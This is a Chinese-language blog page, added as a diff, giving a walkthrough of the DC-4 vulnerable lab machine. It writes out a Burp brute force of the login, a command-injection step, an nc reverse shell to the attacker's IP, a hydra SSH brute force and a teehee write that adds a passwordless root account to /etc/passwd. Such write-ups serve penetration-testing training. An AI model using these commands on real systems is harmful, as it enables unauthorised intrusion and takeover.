@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="渗透靶机DC-4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透DC-4">
+<meta property="og:url" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/index.html">
+<meta property="og:site_name" content="zzZxby&#39;s blog">
+<meta property="og:description" content="渗透靶机DC-4">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202029473.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202128563.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202226885.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202519151.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202913361.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203226560.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203242708.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203328294.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203347097.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203439468.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203448248.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203613219.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203809183.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203913873.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128204159586.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128204744490.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128204807521.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128204924733.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128205955471.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128210224893.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128210455814.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128210620776.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128210834272.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128211103583.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212026053.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212207660.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212347285.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212507721.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212702471.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212916269.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128213318278.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128213422310.png">
+<meta property="og:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128213452430.png">
+<meta property="article:published_time" content="2023-11-30T01:23:27.000Z">
+<meta property="article:modified_time" content="2023-11-30T01:35:18.549Z">
+<meta property="article:author" content="zzZxby">
+<meta property="article:tag" content="保持学习的热情">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202029473.png">
+
+<link rel="canonical" href="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>渗透DC-4 | zzZxby's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+
+
+
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">zzZxby's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/30/%E6%B8%97%E9%80%8FDC-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zzZ.jpg">
+      <meta itemprop="name" content="zzZxby">
+      <meta itemprop="description" content="看山是山，看水是水">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zzZxby's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透DC-4
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-30 09:23:27 / 修改时间：09:35:18" itemprop="dateCreated datePublished" datetime="2023-11-30T09:23:27+08:00">2023-11-30</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+            <div class="post-description">渗透靶机DC-4</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="靶机描述">靶机描述</h1>
+<p>下载地址：http://www.five86.com/downloads/DC-4.zip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.</span><br><span class="line"></span><br><span class="line">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</span><br></pre></td></tr></table></figure>
+<h1 id="信息收集">信息收集</h1>
+<p>扫描同网段存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202029473.png"></p>
+<p>扫描开放端口，发现开放的22端口和80端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 172.18.1.138</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202128563.png"></p>
+<p>访问80端口，是一个web应用，页面只有一个登录框</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202226885.png"></p>
+<p>尝试扫描后台文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.18.1.138/ -e * -i 200</span><br><span class="line"></span><br><span class="line">-e *扫描所有类型文件</span><br><span class="line">-i 200保留响应为200的</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202519151.png"></p>
+<h1 id="web攻击">Web攻击</h1>
+<p>尝试密码爆破web页面，采用bp抓包重放</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128202913361.png"></p>
+<p>发送到Intruder模块，然后设置参数</p>
+<p>根据页面信息显示，该页面是管理员登录界面，可以猜测用户名为admin，剩下就只需要爆破密码就可以</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203226560.png"></p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203242708.png"></p>
+<p>然后开始攻击</p>
+<p>根据返回报的大小，可以判断密码为happy</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203328294.png"></p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203347097.png"></p>
+<p>有了账号密码可以去登录页面</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203439468.png"></p>
+<p>页面提供三个操作命令，抓包可以看到操作指令</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203448248.png"></p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203613219.png"></p>
+<p>发送到Repeater模块，更改参数可以看到不同的执行效果，也就是一个远程命令执行</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203809183.png"></p>
+<h1 id="反弹shell">反弹shell</h1>
+<p>利用这个点，查找一下是否有nc命令，我们可以利用nc来反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">which nc</span><br><span class="line"></span><br><span class="line"># which查找命令，＋号在这里是代表空格的意思，bp直接打空格会被当成两个命令，所以用空格连接</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128203913873.png"></p>
+<p>有了nc，就利用nc反弹shell</p>
+<p>首先在kali监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128204159586.png"></p>
+<p>然后用nc执行反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 172.18.1.128 1234 -e /bin/bash </span><br><span class="line">#   ip是攻击机（kali）的ip</span><br><span class="line">#	nc+172.18.1.128+1234+-e+/bin/bash </span><br><span class="line">#	空格+号代替</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128204744490.png"></p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128204807521.png"></p>
+<p>利用python升级成交互型shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128204924733.png"></p>
+<h1 id="渗透阶段">渗透阶段</h1>
+<p>切换到根目录，收集一些有用信息</p>
+<p>首先发现存在三个用户</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128205955471.png"></p>
+<p>只有jim目录下有文件，一个backups，一个mbox，一个test.sh</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128210224893.png"></p>
+<p>先看backups下的文件，里面存的是一个使用过的密码文件，我们拷贝一份到桌面</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128210455814.png"></p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128210620776.png"></p>
+<p>再看一下mbox发现没有查看权限，test.sh只是一个打印输出的代码没有什么用处</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128210834272.png"></p>
+<p>考虑到服务器还开放了22号端口，提供了一份密码本，我们也清楚了用户，考虑爆破一下ssh登录</p>
+<p>在桌面上创建一个用户名文本</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128211103583.png"></p>
+<p>使用hydra爆破ssh密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hydra（九头蛇）是著名黑客组织thc的一款开源的暴力破解密码工具，功能非常强大，kali下是默认安装的，几乎支持所有协议的在线破解。密码能否破解，在于字典是否强大。</span><br><span class="line"></span><br><span class="line">使用语法：hydra 参数 IP地址 服务名</span><br><span class="line">帮助命令：hydra -h</span><br><span class="line">常用命令：hydra [-l 用户名|–L 用户名文件路径] [-p 密码|–P 密码文件路径] [-t 线程数] [–vV 显示详细信息] [–o 输出文件路径] [–f 找到密码就停止] [–e ns 空密码和指定密码试探] [ip|-M ip列表文件路径]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P password.txt 172.18.1.138 ssh</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212026053.png"></p>
+<p>得到ssh账号密码后，连接上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@172.18.1.138</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212207660.png"></p>
+<p>继续进行信息收集，刚才没看到的那个mbox这次可以查看了</p>
+<p>是一份邮件信息提示</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212347285.png"></p>
+<p>查看客户端mail，输入编号查看对应的邮件</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212507721.png"></p>
+<p>这里我们charles的密码了，切换用户</p>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212702471.png"></p>
+<h1 id="提权">提权</h1>
+<p>查看当前用户能执行的命令权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">-l 列出当前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128212916269.png"></p>
+<p>发现teehee具有root权限，尝试搜索teehee提权信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">teehee命令可以往一个文件追加内容，可以通过它向/etc/passwd写入内容，新增一个超级用户</span><br><span class="line"></span><br><span class="line">echo "test::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</span><br><span class="line"># 用户名test 没有密码为管理员权限 进入的时候运行/bin/bash</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128213318278.png"></p>
+<p>提权成功！</p>
+<h1 id="查找flag">查找flag</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128213422310.png"></p>
+<p>查看flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/30/%E6%B8%97%E9%80%8FDC-4/image-20231128213452430.png"></p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>bp爆破用户名账号密码</li>
+<li>nc反弹shell</li>
+<li>hydra爆破</li>
+<li>linux mail命令查看邮件</li>
+<li>teehee提权</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/27/%E6%B2%B3%E5%8D%97%E7%9C%81%E7%AC%AC%E4%BA%94%E5%B1%8A%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF/" rel="prev" title="河南省第五届金盾信安杯">
+      <i class="fa fa-chevron-left"></i> 河南省第五届金盾信安杯
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">Web攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="nav-number">5.</span> <span class="nav-text">渗透阶段</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9F%A5%E6%89%BEflag"><span class="nav-number">7.</span> <span class="nav-text">查找flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zzZxby"
+      src="/images/zzZ.jpg">
+  <p class="site-author-name" itemprop="name">zzZxby</p>
+  <div class="site-description" itemprop="description">看山是山，看水是水</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zzZxby</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">41k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:30</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
